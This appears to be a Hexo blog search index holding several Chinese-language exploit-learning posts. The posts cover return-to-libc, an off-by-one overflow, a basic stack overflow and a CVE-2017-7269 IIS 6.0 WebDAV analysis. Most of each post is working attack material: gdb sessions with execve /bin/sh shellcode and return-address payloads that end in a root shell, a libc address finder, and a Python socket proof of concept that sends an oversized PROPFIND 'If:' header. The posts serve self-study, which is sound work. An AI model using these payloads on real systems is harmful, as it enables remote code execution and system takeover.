<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[linux下return-to-libc]]></title>
      <url>http://yoursite.com/2017/04/11/linux%E4%B8%8Breturn-to-libc/</url>
      <content type="html"><![CDATA[<p>漏洞源代码就是我上一章的代码<br>编译命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -g -fno-stack-protector -o vuln vuln.c</div></pre></td></tr></table></figure></p>
<p>注意：“-z execstack”参数不传递给gcc，这时候堆栈是不可执行的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">There are 9 program headers, starting at offset 52</div><div class="line"></div><div class="line">Program Headers:</div><div class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</div><div class="line">  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4</div><div class="line">  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1</div><div class="line">      [Requesting program interpreter: /lib/ld-linux.so.2]</div><div class="line">  LOAD           0x000000 0x08048000 0x08048000 0x00634 0x00634 R E 0x1000</div><div class="line">  LOAD           0x000f14 0x08049f14 0x08049f14 0x00104 0x0010c RW  0x1000</div><div class="line">  DYNAMIC        0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW  0x4</div><div class="line">  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4</div><div class="line">  GNU_EH_FRAME   0x00053c 0x0804853c 0x0804853c 0x00034 0x00034 R   0x4</div><div class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</div><div class="line">  GNU_RELRO      0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1</div></pre></td></tr></table></figure></p>
<p>  构造shellcode前，要先明白，堆栈布局，我就不画图了，268填充物+system地址+exit地址+／bin/sh地址。就照这样排版，就可以返回shell。exit那个地方可以好想可以用填充物替代。</p>
<p>  最终可以获得shell<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">  (gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;\xb0\xe0\xe5\xb7&quot;+&quot;B&quot;*4+&quot;\xa0\x26\xf8\xb7&quot;&apos;`</div><div class="line">Starting program: /home/hackyzh/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;\xb0\xe0\xe5\xb7&quot;+&quot;B&quot;*4+&quot;\xa0\x26\xf8\xb7&quot;&apos;`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBB?&amp;??</div><div class="line"># exit</div></pre></td></tr></table></figure></p>
<p>获得system等内存地址的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line">#include &lt;signal.h&gt;</div><div class="line"></div><div class="line">#include &lt;setjmp.h&gt;</div><div class="line"></div><div class="line">int step;</div><div class="line">jmp_buf env;</div><div class="line"></div><div class="line">void fault()&#123;</div><div class="line"></div><div class="line">if(step&lt;0)&#123;</div><div class="line">   longjmp(env,1);</div><div class="line">&#125;else&#123;</div><div class="line">  printf(&quot;Can&apos;t find /bin/sh in libc,use env insted...\n&quot;);</div><div class="line"> exit(0);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc,char **argv)&#123;</div><div class="line">     void *handle;</div><div class="line">     int *sysaddr,*exitaddr;</div><div class="line">     long shell;</div><div class="line">     char examp[512];</div><div class="line">     char *args[3];</div><div class="line">     char *envs[1];</div><div class="line">     long *lp;</div><div class="line">  </div><div class="line">    handle=dlopen(NULL,RTLD_LOCAL);</div><div class="line">    *(void **)(&amp;sysaddr)=dlsym(handle,&quot;system&quot;);</div><div class="line">    sysaddr+=4096;  //base address/4</div><div class="line">    printf(&quot;system() found at %08x\n&quot;,sysaddr);</div><div class="line">    *(void **)(&amp;exitaddr)=dlsym(handle,&quot;exit&quot;);</div><div class="line">    exitaddr+=4096; //base address/4</div><div class="line">    printf(&quot;exit() found at %08x\n&quot;,exitaddr);</div><div class="line"></div><div class="line"></div><div class="line">    if(setjmp(env))</div><div class="line">       step=1;</div><div class="line">    else</div><div class="line">       step=-1;</div><div class="line">    shell=(int)sysaddr;</div><div class="line">    signal(SIGSEGV,fault);</div><div class="line">    do</div><div class="line">      while(memcmp((void *)shell,&quot;/bin/sh&quot;,8)) shell+=step;</div><div class="line">    while(!(shell&amp;0xff)||!(shell,0xff00)||!(shell &amp; 0xff0000)|| !(shell,0xff000000));</div><div class="line">    printf(&quot;\&quot;/bin/sh\&quot; found at %08x\n&quot;,shell+16384);  //base address</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以对比gdb调试得出的system等地址做比较，这里有个问题,不知道这个代码的base address是怎么得出来的。<br>参考文章：<br>翻译文章系列 linux x86<br>灰帽黑客第四版</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux下off by one利用]]></title>
      <url>http://yoursite.com/2017/04/11/linux%E4%B8%8Boff-by-one%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>漏洞代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">void foo(char* arg);</div><div class="line">void bar(char* arg);</div><div class="line">void foo(char* arg) &#123;</div><div class="line"> bar(arg); /* [1] */</div><div class="line">&#125;</div><div class="line">void bar(char* arg) &#123;</div><div class="line"> char buf[256];</div><div class="line"> strcpy(buf, arg); /* [2] */</div><div class="line">&#125;</div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line"> if(strlen(argv[1])&gt;256) &#123; /* [3] */</div><div class="line">  printf(&quot;Attempted Buffer Overflow\n&quot;);</div><div class="line">  fflush(stdout);</div><div class="line">  return -1;</div><div class="line"> &#125;</div><div class="line"> foo(argv[1]); /* [4] */</div><div class="line"> return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>关键利用点就是leave指令和ret指令，写完shellcode后，后面重复覆盖的返回地址。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div></pre></td><td class="code"><pre><div class="line">(gdb) r</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line">Starting program: /root/vuln `python -c &apos;print &quot;\x90&quot;*147+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;+&quot;\x2c\xf5\xff\xbf&quot;*21&apos;`</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048496 in bar ()</div><div class="line">(gdb) disas bar</div><div class="line">Dump of assembler code for function bar:</div><div class="line">   0x08048477 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048478 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x0804847a &lt;+3&gt;:	sub    $0x108,%esp</div><div class="line">   0x08048480 &lt;+9&gt;:	mov    0x8(%ebp),%eax</div><div class="line">   0x08048483 &lt;+12&gt;:	mov    %eax,0x4(%esp)</div><div class="line">   0x08048487 &lt;+16&gt;:	lea    -0x100(%ebp),%eax</div><div class="line">   0x0804848d &lt;+22&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048490 &lt;+25&gt;:	call   0x8048370 &lt;strcpy@plt&gt;</div><div class="line">   0x08048495 &lt;+30&gt;:	leave  </div><div class="line">=&gt; 0x08048496 &lt;+31&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) i reg</div><div class="line">eax            0xbffff508	-1073744632</div><div class="line">ecx            0xbffff8f0	-1073743632</div><div class="line">edx            0xbffff605	-1073744379</div><div class="line">ebx            0xb7fc6ff4	-1208193036</div><div class="line">esp            0xbffff60c	0xbffff60c</div><div class="line">ebp            0xbffff600	0xbffff600</div><div class="line">esi            0x0	0</div><div class="line">edi            0xbffff8f4	-1073743628</div><div class="line">eip            0x8048496	0x8048496 &lt;bar+31&gt;</div><div class="line">eflags         0x200202	[ IF ID ]</div><div class="line">cs             0x73	115</div><div class="line">ss             0x7b	123</div><div class="line">ds             0x7b	123</div><div class="line">es             0x7b	123</div><div class="line">fs             0x0	0</div><div class="line">gs             0x33	51</div><div class="line">(gdb) x/x $esp</div><div class="line">0xbffff60c:	0x08048475</div><div class="line">(gdb) x/x $ebp</div><div class="line">0xbffff600:	0xbffff52c</div><div class="line">(gdb) n</div><div class="line">Single stepping until exit from function bar,</div><div class="line">which has no line number information.</div><div class="line">0x08048475 in foo ()</div><div class="line">(gdb) i reg</div><div class="line">eax            0xbffff508	-1073744632</div><div class="line">ecx            0xbffff8f0	-1073743632</div><div class="line">edx            0xbffff605	-1073744379</div><div class="line">ebx            0xb7fc6ff4	-1208193036</div><div class="line">esp            0xbffff610	0xbffff610</div><div class="line">ebp            0xbffff600	0xbffff600</div><div class="line">esi            0x0	0</div><div class="line">edi            0xbffff8f4	-1073743628</div><div class="line">eip            0x8048475	0x8048475 &lt;foo+17&gt;</div><div class="line">eflags         0x200202	[ IF ID ]</div><div class="line">cs             0x73	115</div><div class="line">ss             0x7b	123</div><div class="line">ds             0x7b	123</div><div class="line">es             0x7b	123</div><div class="line">fs             0x0	0</div><div class="line">gs             0x33	51</div><div class="line">(gdb) x/x $esp</div><div class="line">0xbffff610:	0xbffff7f3</div><div class="line">(gdb) x/x $ebp</div><div class="line">0xbffff600:	0xbffff52c</div><div class="line">(gdb) disas bar</div><div class="line">Dump of assembler code for function bar:</div><div class="line">   0x08048477 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048478 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x0804847a &lt;+3&gt;:	sub    $0x108,%esp</div><div class="line">   0x08048480 &lt;+9&gt;:	mov    0x8(%ebp),%eax</div><div class="line">   0x08048483 &lt;+12&gt;:	mov    %eax,0x4(%esp)</div><div class="line">   0x08048487 &lt;+16&gt;:	lea    -0x100(%ebp),%eax</div><div class="line">   0x0804848d &lt;+22&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048490 &lt;+25&gt;:	call   0x8048370 &lt;strcpy@plt&gt;</div><div class="line">   0x08048495 &lt;+30&gt;:	leave  </div><div class="line">   0x08048496 &lt;+31&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line"></div><div class="line">(gdb) disas foo</div><div class="line">Dump of assembler code for function foo:</div><div class="line">   0x08048464 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048465 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048467 &lt;+3&gt;:	sub    $0x4,%esp</div><div class="line">   0x0804846a &lt;+6&gt;:	mov    0x8(%ebp),%eax</div><div class="line">   0x0804846d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048470 &lt;+12&gt;:	call   0x8048477 &lt;bar&gt;</div><div class="line">=&gt; 0x08048475 &lt;+17&gt;:	leave  </div><div class="line">   0x08048476 &lt;+18&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) n</div><div class="line">Single stepping until exit from function foo,</div><div class="line">which has no line number information.</div><div class="line">0xbffff52c in ?? ()</div><div class="line">(gdb) disas foo</div><div class="line">Dump of assembler code for function foo:</div><div class="line">   0x08048464 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048465 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048467 &lt;+3&gt;:	sub    $0x4,%esp</div><div class="line">   0x0804846a &lt;+6&gt;:	mov    0x8(%ebp),%eax</div><div class="line">   0x0804846d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048470 &lt;+12&gt;:	call   0x8048477 &lt;bar&gt;</div><div class="line">   0x08048475 &lt;+17&gt;:	leave  </div><div class="line">   0x08048476 &lt;+18&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) i reg</div><div class="line">eax            0xbffff508	-1073744632</div><div class="line">ecx            0xbffff8f0	-1073743632</div><div class="line">edx            0xbffff605	-1073744379</div><div class="line">ebx            0xb7fc6ff4	-1208193036</div><div class="line">esp            0xbffff608	0xbffff608</div><div class="line">ebp            0xbffff52c	0xbffff52c</div><div class="line">esi            0x0	0</div><div class="line">edi            0xbffff8f4	-1073743628</div><div class="line">eip            0xbffff52c	0xbffff52c</div><div class="line">eflags         0x200202	[ IF ID ]</div><div class="line">cs             0x73	115</div><div class="line">ss             0x7b	123</div><div class="line">ds             0x7b	123</div><div class="line">es             0x7b	123</div><div class="line">fs             0x0	0</div><div class="line">gs             0x33	51</div><div class="line">(gdb) x/x $esp</div><div class="line">0xbffff608:	0xbffff600</div><div class="line">(gdb) x/x 0xbffff600</div><div class="line">0xbffff600:	0xbffff52c</div><div class="line">(gdb) x/x 0xbffff52c</div><div class="line">0xbffff52c:	0x90909090</div></pre></td></tr></table></figure>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux下栈溢出学习笔记]]></title>
      <url>http://yoursite.com/2017/04/09/linux%E4%B8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>代码是直接拷贝我翻译的文章来的，发现linux下的利用没有windows的直白简单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line">        /* [1] */ char buf[256];</div><div class="line">        /* [2] */ strcpy(buf,argv[1]);</div><div class="line">        /* [3] */ printf(&quot;Input:%s\n&quot;,buf);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译过后，不多说直接发送字符串覆盖返回地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;B&quot;*4&apos;`</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line"></div><div class="line">Starting program: /home/hackyzh/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;B&quot;*4&apos;`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x42424242 in ?? ()</div></pre></td></tr></table></figure></p>
<p>看到返回地址覆盖被覆盖，现在可以构造exp布局了。<br>我一直以为下面的代码就可以获得esp地址利用了，原来是我想错了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">unsigned int get_sp(void)&#123;</div><div class="line"></div><div class="line"></div><div class="line">   __asm__(&quot;movl %esp,%eax&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line"> printf(&quot;stack pointer(esp):0x%x\n&quot;,get_sp());</div><div class="line"></div><div class="line">return 0;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行代码后会获得一个地址，事先要关闭aslr.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@ubuntu:/home/hackyzh# ./get_esp </div><div class="line">stack pointer(esp):0xbffff728</div></pre></td></tr></table></figure></p>
<p>运行代码发现失败了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;\x28\xf7\xff\xbf&quot;+&quot;\x90&quot;*20+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&apos;`</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line"></div><div class="line">Starting program: /home/hackyzh/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;\x28\xf7\xff\xbf&quot;+&quot;\x90&quot;*20+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&apos;`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(???????????????????????1?Ph//shh/bin??PS??1Ұ</div><div class="line">                                                                               ̀</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0xbffff728 in ?? ()</div></pre></td></tr></table></figure></p>
<p>查看esp地址处的情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) x/20x $esp-10</div><div class="line">0xbffff5c6:	0x41	0x41	0x41	0x41	0x41	0x41	0x28	0xf7</div><div class="line">0xbffff5ce:	0xff	0xbf	0x90	0x90	0x90	0x90	0x90	0x90</div><div class="line">0xbffff5d6:	0x90	0x90	0x90	0x90</div></pre></td></tr></table></figure></p>
<p>卧槽这跟我想的情况完全不一样，0xbffff728和0xbffff5d0差距不是一般的远，这就尴尬了，只好改一下一地址，也算为自己提醒一下。不明白哪里有问题了。</p>
<p>最终利用成功,虽然我本身用的是root用户，不过跟返回的root shell不冲突。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;\xd0\xf5\xff\xbf&quot;+&quot;\x90&quot;*20+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&apos;`</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line"></div><div class="line">Starting program: /home/hackyzh/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;\xd0\xf5\xff\xbf&quot;+&quot;\x90&quot;*20+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&apos;`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????????????????????????1?Ph//shh/bin??PS??1Ұ</div><div class="line">                                                                               ̀</div><div class="line">process 11131 is executing new program: /bin/dash</div><div class="line"># whoami</div><div class="line">root</div></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[(翻译)Linux (x86) Exploit 开发系列教程]]></title>
      <url>http://yoursite.com/2017/04/06/Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>发表在看雪上，所以直接贴链接了，感觉这个系列教程对于我们这种linux菜鸟很有帮助，后续会不断翻译。</p>
<p>典型的基于堆栈的溢出：<a href="http://bbs.pediy.com/thread-216868.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216868.htm</a><br>整数溢出：<a href="http://bbs.pediy.com/thread-216869.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216869.htm</a><br>Off-By-One 漏洞 (基于栈): <a href="http://bbs.pediy.com/thread-216954.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216954.htm</a><br>使用return-to-libc绕过NX bit: <a href="http://bbs.pediy.com/thread-216956.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216956.htm</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2017-7269个人学习分析]]></title>
      <url>http://yoursite.com/2017/03/30/CVE-2017-7269%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01    环境"></a>0x01    环境</h2><p>Windwos server 2003</p>
<p>IIS6.0  WEBDAV开启</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>根据网上得知是ScStoragePathFromUrl函数造成的缓冲区溢出。通过一个以“If: &lt;<a href="http://”开始的较长header头的PROPFIND请求执行任意代码。这里就简单的分析一下，首先构造一个简易的poc代码。" target="_blank" rel="external">http://”开始的较长header头的PROPFIND请求执行任意代码。这里就简单的分析一下，首先构造一个简易的poc代码。</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">import socket  </div><div class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </div><div class="line">sock.connect((&apos;10.121.21.55&apos;,80))  </div><div class="line">pay=&apos;PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n&apos;</div><div class="line">pay+=&apos;If: &lt;http://localhost/aaaaaaa&apos;</div><div class="line">pay+=&apos;\x41&apos;*9000</div><div class="line">pay+=&apos;&gt;&apos;</div><div class="line">pay+=&apos;&gt;\r\n\r\n&apos;</div><div class="line">print pay</div><div class="line">sock.send(pay)  </div><div class="line">data = sock.recv(80960)  </div><div class="line">print data </div><div class="line">sock.close</div></pre></td></tr></table></figure>
<p>访问IIS6.0搭建的网站后产生wswp.exe的进程，利用windbg工具附加进程，再运行poc代码，会触发异常。<br> <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/1.png" alt="picture"><br>这里的值为什么会变成00410041这样呢，可能是经过前面转化为unicode字符了，利用ub命令查看前面的反汇编代码，然后重新附加调试，在httpext!ScStoragePathFromUrl+0x343这个位置下一个断点。<br> <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/2.png" alt="picture1"><br>   在重新附加下调试后，会断在断点处，从上面的图已经知道esi来源于ebp-444h，单步执行查看数据即可。<br>  <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/3.png" alt="picture2"></p>
